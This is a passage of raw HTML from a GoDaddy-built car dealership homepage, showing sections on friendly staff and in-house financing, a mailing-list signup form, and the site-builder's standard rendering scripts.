c1-25 c1-b c1-4k c1-2p c1-3j c1-2q c1-2r c1-2s c1-2t">Friendly Staff</h4><div data-ux="ContentText" alignment="center" data-aid="ABOUT_DESCRIPTION_RENDERED1" data-typography="BodyAlpha" class="x-el x-el-p c1-1 c1-2 c1-1p c1-1q c1-4l c1-24 c1-25 c1-4m c1-4n c1-4o c1-4p c1-4q c1-4r c1-4s c1-4t c1-4u c1-4v c1-4w c1-4x c1-4y c1-4z c1-50 c1-51 c1-52 c1-53 c1-54 c1-55 c1-56 c1-57 c1-58 c1-59 c1-5a c1-5b c1-5c c1-5d c1-2v c1-b c1-3i c1-c c1-3j c1-d c1-e c1-f c1-g x-rt"><p style="margin:0"><span class="x-el x-el-span c1-5j c1-5k c1-b c1-c c1-d c1-e c1-f c1-g">From the moment you arrive on our lot to when you get the new keys to your vehicle, our staff is there to ensure you have an enjoyable experience. They have decades of experience between them, so don't be afraid to get your questions answered!</span></p></div></div></div></div></div><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-2v c1-42 c1-43 c1-z c1-44 c1-45 c1-46 c1-47 c1-b c1-c c1-48 c1-49 c1-4a c1-4b c1-d c1-e c1-f c1-g"><div data-ux="Grid" class="x-el x-el-div c1-1 c1-2 c1-36 c1-3s c1-3t c1-3u c1-24 c1-3v c1-25 c1-3x c1-39 c1-b c1-c c1-3y c1-3z c1-4c c1-41 c1-d c1-e c1-f c1-g"><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-2v c1-42 c1-43 c1-z c1-44 c1-45 c1-4d c1-47 c1-36 c1-39 c1-38 c1-b c1-c c1-4e c1-4f c1-48 c1-49 c1-4g c1-4b c1-d c1-e c1-f c1-g"><div data-ux="ContentBasic" index="2" id="6df093d2-18b4-47da-a894-f28d1d2f2ba4" class="x-el x-el-div x-el c1-1 c1-2 c1-36 c1-37 c1-4 c1-4h c1-38 c1-11 c1-3a c1-3b c1-b c1-c c1-4i c1-4j c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><h4 role="heading" aria-level="4" data-ux="ContentHeading" data-aid="ABOUT_HEADLINE_RENDERED2" data-typography="HeadingDelta" class="x-el x-el-h4 c1-1 c1-2 c1-1p c1-1q c1-3g c1-22 c1-23 c1-24 c1-25 c1-b c1-4k c1-2p c1-3j c1-2q c1-2r c1-2s c1-2t">Our Financing Program</h4><div data-ux="ContentText" alignment="center" data-aid="ABOUT_DESCRIPTION_RENDERED2" data-typography="BodyAlpha" class="x-el x-el-p c1-1 c1-2 c1-1p c1-1q c1-4l c1-24 c1-25 c1-4m c1-4n c1-4o c1-4p c1-4q c1-4r c1-4s c1-4t c1-4u c1-4v c1-4w c1-4x c1-4y c1-4z c1-50 c1-51 c1-52 c1-53 c1-54 c1-55 c1-56 c1-57 c1-58 c1-59 c1-5a c1-5b c1-5c c1-5d c1-2v c1-b c1-3i c1-c c1-3j c1-d c1-e c1-f c1-g x-rt"><p style="margin:0"><span class="x-el x-el-span c1-5j c1-5k c1-b c1-c c1-d c1-e c1-f c1-g">Are you looking to take out a loan for your next vehicle? Avoid spending time traveling to credit unions, and apply for a loan with us! We guarantee fixed loan repayment terms that will only change if both the customer and our financial department agree.&nbsp;</span></p></div></div></div></div></div></div></div></section> </div></div></div><div id="32ea1d72-6fe8-4303-ade4-1171f016e142" class="widget widget-subscribe widget-subscribe-subscribe-2"><div data-ux="Widget" role="region" class="x-el x-el-div x-el c1-1 c1-2 c1-5l c1-b c1-c c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div> <section data-ux="Section" class="x-el x-el-section c1-1 c1-2 c1-5l c1-i c1-j c1-k c1-l c1-m c1-n c1-o c1-p c1-b c1-c c1-r c1-s c1-d c1-e c1-f c1-g"><div data-ux="Container" class="x-el x-el-div c1-1 c1-2 c1-v c1-w c1-x c1-y c1-z c1-b c1-c c1-14 c1-d c1-15 c1-e c1-17 c1-f c1-18 c1-g"><div data-ux="Group" class="x-el x-el-div c1-1 c1-2 c1-5m c1-b c1-c c1-d c1-5n c1-e c1-f c1-g"><div data-ux="Grid" class="x-el x-el-div c1-1 c1-2 c1-36 c1-3s c1-3t c1-3u c1-24 c1-3v c1-25 c1-3x c1-b c1-c c1-3y c1-3z c1-4c c1-41 c1-d c1-e c1-f c1-g"><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-2v c1-42 c1-5o c1-z c1-44 c1-45 c1-4d c1-47 c1-b c1-c c1-48 c1-49 c1-4g c1-4b c1-d c1-e c1-f c1-g"><div style="width:100%"><div id="32ea1d72-6fe8-4303-ade4-1171f016e142-bootstrap-container"><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-t c1-b c1-c c1-d c1-5p c1-5q c1-e c1-f c1-g"><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-5r c1-b c1-c c1-d c1-3m c1-5s c1-e c1-f c1-g"><h3 role="heading" aria-level="3" data-ux="HeadingMiddle" data-aid="SECTION_TITLE_REND" data-typography="HeadingGamma" class="x-el x-el-h3 c1-1 c1-2 c1-1p c1-1q c1-3g c1-22 c1-23 c1-24 c1-25 c1-11 c1-b c1-5t c1-26 c1-3j c1-29 c1-2a c1-2b c1-2c">Join Our Mailing List</h3></div><div data-ux="Block" data-aid="SUBSCRIBE_INNER_FORM_REND" class="x-el x-el-div c1-1 c1-2 c1-2v c1-b c1-c c1-d c1-e c1-f c1-g"><form aria-live="polite" data-ux="InputGroup" class="x-el x-el-form x-el c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g c1-1 c1-2 c1-25 c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-36 c1-37 c1-b c1-c c1-5u c1-d c1-e c1-f c1-g"><div data-ux="Block" class="x-el x-el-div c1-1 c1-2 c1-36 c1-2v c1-5v c1-b c1-c c1-5w c1-5x c1-d c1-e c1-f c1-g"> <div data-ux="InputFloatLabel" class="x-el x-el-div c1-1 c1-2 c1-12 c1-4 c1-b c1-c c1-5y c1-5z c1-d c1-e c1-f c1-g"><input type="text" role="textbox" aria-multiline="false" data-ux="InputFloatLabel" id="input124870" value="" data-typography="InputAlpha" class="x-el x-el-input c1-1 c1-2 c1-60 c1-61 c1-4 c1-62 c1-63 c1-64 c1-65 c1-66 c1-67 c1-68 c1-69 c1-6a c1-6b c1-b c1-6c c1-6d c1-3j c1-6e c1-6f c1-6g c1-6h c1-6i c1-6j c1-6k c1-6l c1-6m c1-6n c1-6o c1-5y c1-5z c1-6p c1-6q c1-6r c1-6s"/><label data-ux="InputFloatLabelLabel" for="input124870" data-typography="InputAlpha" class="x-el x-el-label c1-1 c1-2 c1-1p c1-1q c1-2h c1-6t c1-6u c1-6v c1-6w c1-b c1-6c c1-6d c1-3j c1-6p c1-6q c1-6r c1-6s">Email</label></div> </div><button tcclTracking="click" data-ux="Button" type="submit" data-tccl="ux2.gem-subscribe.submit_form.click,click" data-aid="SUBSCRIBE_SUBMIT_BUTTON_REND" data-typography="ButtonAlpha" class="x-el x-el-button c1-6x c1-2 c1-4 c1-22 c1-23 c1-1s c1-6y c1-6z c1-38 c1-39 c1-11 c1-1o c1-1q c1-1p c1-12 c1-z c1-70 c1-71 c1-72 c1-73 c1-74 c1-69 c1-75 c1-76 c1-b c1-28 c1-30 c1-6d c1-77 c1-78 c1-79 c1-7a c1-5w c1-5x c1-7b c1-7c c1-6p c1-6q c1-6r c1-6s">Sign up</button></div></form></div></div></div></div></div></div></div></div></section> </div></div></div><div id="55a81bc3-d4d9-465a-94ec-ee7463736f03" class="widget widget-footer widget-footer-footer-3"><div data-ux="Widget" role="contentinfo" class="x-el x-el-div x-el c1-1 c1-2 c1-h c1-b c1-c c1-d c1-e c1-f c1-g c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div> <section data-ux="Section" class="x-el x-el-section c1-1 c1-2 c1-h c1-7d c1-7e c1-k c1-l c1-m c1-n c1-o c1-p c1-b c1-c c1-r c1-s c1-d c1-e c1-f c1-g"><div data-ux="Container" class="x-el x-el-div c1-1 c1-2 c1-v c1-w c1-x c1-y c1-z c1-b c1-c c1-14 c1-d c1-15 c1-e c1-17 c1-f c1-18 c1-g"><div data-ux="Layout" class="x-el x-el-div c1-1 c1-2 c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="Grid" class="x-el x-el-div c1-1 c1-2 c1-36 c1-3s c1-3t c1-3u c1-24 c1-23 c1-25 c1-22 c1-38 c1-11 c1-b c1-c c1-d c1-e c1-f c1-g"><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-7f c1-42 c1-43 c1-z c1-44 c1-7g c1-4d c1-7h c1-b c1-c c1-d c1-7i c1-7j c1-e c1-f c1-g"><div data-ux="FooterDetails" data-aid="FOOTER_COPYRIGHT_RENDERED" data-typography="DetailsAlpha" class="x-el x-el-p c1-1 c1-2 c1-1p c1-1q c1-4l c1-24 c1-25 c1-b c1-7k c1-6d c1-3j c1-6p c1-7l c1-6q c1-6r c1-6s x-rt"><p style="margin:0"><span>Copyright © 2020 xuzexazx - All Rights Reserved.</span></p></div></div><div data-ux="GridCell" class="x-el x-el-div c1-1 c1-2 c1-3s c1-7f c1-42 c1-43 c1-z c1-44 c1-7g c1-4d c1-7h c1-b c1-c c1-d c1-7i c1-7j c1-e c1-f c1-g"><p data-ux="FooterDetails" data-aid="FOOTER_POWERED_BY_RENDERED" data-typography="DetailsAlpha" class="x-el x-el-p c1-1 c1-2 c1-1p c1-1q c1-4l c1-1h c1-25 c1-b c1-7k c1-6d c1-3j c1-6p c1-7m c1-5n c1-6q c1-6r c1-6s"><span>Powered by GoDaddy <a rel="nofollow noopener" role="link" aria-haspopup="true" data-ux="Link" target="_blank" data-aid="FOOTER_POWERED_BY_RENDERED_LINK" href="https://www.godaddy.com/websites/website-builder?isc=pwugc&amp;utm_source=wsb&amp;utm_medium=applications&amp;utm_campaign=en-us_corp_applications_base" data-typography="LinkAlpha" class="x-el x-el-a c1-1m c1-1n c1-1o c1-1p c1-1q c1-1r c1-1s c1-1h c1-b c1-7n c1-6d c1-1y c1-7o c1-7p c1-6p c1-7m c1-5n c1-6q c1-6r c1-6s" data-tccl="ux2.FOOTER.footer3.Layout.Default.Link.Default.124871.click,click">Website Builder</a></span></p></div></div></div></div><div id="bs-5"></div></section> </div></div></div><div id="2d4c35e8-b437-43c1-9aed-390ace0cceda" class="widget widget-messaging widget-messaging-messaging-1"></div></div></div></div>
<script type="text/javascript" src="//img1.wsimg.com/ceph-p3-01/website-builder-data-prod/static/widgets/UX.3.63.13.js" crossorigin></script>
<script type="text/javascript">window.cxs && window.cxs.setOptions({ prefix: "c2-" });</script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/gpub/381d989332cd777/script.js" crossorigin></script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/gpub/eb031feddb815e74/script.js" crossorigin></script>
<script type="text/javascript">window.wsb['context-bs-1']={"renderMode":"PUBLISH","fonts":["cabin","default",""],"colors":["#839ed5"],"fontScale":"medium","locale":"en-US","language":"en","internalLinks":{},"isHomepage":true,"navigationMap":{"a9f148e7-6b12-4d36-95f0-1b4a4be338a5":{"isFlyoutMenu":false,"active":true,"pageId":"a9f148e7-6b12-4d36-95f0-1b4a4be338a5","name":"Home","href":"\u002F","target":"","visible":true,"requiresAuth":false,"tags":[],"rel":"","type":"page","showInFooter":false}},"theme":"Theme16"};</script>
<script type="text/javascript">(function(props,context) {
        Core.utils.renderBootstrap({
          elId:'bs-1',
          componentName:'Parallax',
          props:props,
          context:context,
          contextKey:'context-bs-1',
          radpack:""
        });
      })({"speed":-2,"uniqueId":"header_parallax124862","noTransform":true,"widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","section":"default","category":"accent","locale":"en-US","renderMode":"PUBLISH"},{"widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","widgetType":"HEADER","widgetPreset":"header9","section":"default","category":"accent","fontSize":"medium","fontFamily":"alternate","group":"Section","groupType":"Default","themeOverrides":{}});</script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/gpub/9b757a1e28962547/script.js" crossorigin></script>
<script type="text/javascript">(function(props,context) {
        Core.utils.renderBootstrap({
          elId:'bs-2',
          componentName:'DynamicFontScaler',
          props:props,
          context:context,
          contextKey:'context-bs-1',
          radpack:""
        });
      })({"text":"xuzexazx","containerId":"logo-container-124864","targetId":"logo-text-124865","fontSizes":["xxlarge","xlarge","large"],"style":{"display":"inline-block","maxWidth":"100%"},"widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","section":"default","category":"neutral","locale":"en-US","renderMode":"PUBLISH"},{"widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","widgetType":"HEADER","widgetPreset":"header9","section":"default","category":"neutral","fontSize":"medium","fontFamily":"alternate","group":"Logo","groupType":"Default","themeOverrides":{}});</script>
<script type="text/javascript">(function(props,context) {
        Core.utils.renderBootstrap({
          elId:'bs-3',
          componentName:'Parallax',
          props:props,
          context:context,
          contextKey:'context-bs-1',
          radpack:""
        });
      })({"speed":-2,"uniqueId":"header_parallax124866","widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","section":"default","category":"accent","locale":"en-US","renderMode":"PUBLISH"},{"widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","widgetType":"HEADER","widgetPreset":"header9","section":"default","category":"accent","fontSize":"medium","fontFamily":"alternate","group":"Section","groupType":"Default","themeOverrides":{}});</script>
<script type="text/javascript">(function(props,context) {
        Core.utils.renderBootstrap({
          elId:'bs-4',
          componentName:'DynamicFontScaler',
          props:props,
          context:context,
          contextKey:'context-bs-1',
          radpack:""
        });
      })({"font":"primary","text":"Quality Cars, Quality Care","containerId":"tagline-container-124868","targetId":"dynamic-tagline-124869","fontSizes":["large","medium"],"maxLines":4,"style":{"display":"inline-block","maxWidth":"100%","whiteSpace":"pre-line"},"widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","section":"default","category":"neutral","locale":"en-US","renderMode":"PUBLISH"},{"widgetId":"332e3eac-00db-46ff-b558-919c4bbb1074","widgetType":"HEADER","widgetPreset":"header9","section":"default","category":"neutral","fontSize":"medium","fontFamily":"primary","group":"Hero","groupType":"Default","themeOverrides":{}});</script>
<script type="text/javascript">Number(window.vctElements)||(window.vctElements=0),window.vctElements++,window.markVisuallyComplete();</script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/gpub/a68e5c847cd22cf4/script.js" crossorigin></script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/9233ab79-a97e-4a45-8de9-bfc5bd6fd667/gpub/931899716eb31148/script.js" crossorigin></script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/gpub/fe432c2d11d8087f/script.js" crossorigin></script>
<script type="text/javascript" src="//img1.wsimg.com/blobby/go/9233ab79-a97e-4a45-8de9-bfc5bd6fd667/gpub/d9fe682c71ca39fb/script.js" crossorigin></script>
<script type="text/javascript">document.getElementById('page-124859').addEventListener('click', function() {}, false);</script></body></html>
